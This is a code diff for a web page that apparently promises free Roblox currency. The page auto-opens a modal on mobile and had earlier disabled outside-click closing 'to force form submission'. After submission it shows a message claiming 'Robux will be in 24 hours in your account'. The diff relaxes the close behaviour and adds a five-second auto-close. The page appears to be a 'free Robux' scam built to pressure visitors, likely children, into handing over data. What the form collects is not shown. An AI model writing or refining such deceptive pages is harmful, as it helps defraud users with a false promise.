@@ -164,7 +164,15 @@
                 });
             }
 
-            // Removed outside click close behavior to force form submission
+            // Allow closing by clicking outside if already submitted
+            window.addEventListener('click', (event) => {
+                if (event.target == modal) {
+                    const successCard = modal.querySelector('.success-card');
+                    if (successCard) {
+                        modal.style.display = "none";
+                    }
+                }
+            });
 
             // Auto-open modal on mobile when page loads
             window.addEventListener('load', () => {
@@ -226,9 +234,15 @@
                                 <div class="success-card">
                                     <h2>✅ Success!</h2>
                                     <p>Success: Robux will be in 24 hours in your account! 🎁🌟</p>
+                                    <button type="button" class="glow-button" style="margin-top: 20px; font-size: 1.1rem; padding: 12px;" onclick="document.getElementById('robux-modal').style.display='none'">Close Window</button>
                                 </div>
                             `;
-                            // If it's a modal, maybe relax the close restriction or auto-close after 5s
+                            // Auto-close modal after 5 seconds
+                            if (modal) {
+                                setTimeout(() => {
+                                    modal.style.display = "none";
+                                }, 5000);
+                            }
                         } else {
                             throw new Error('Submission failed');
                         }
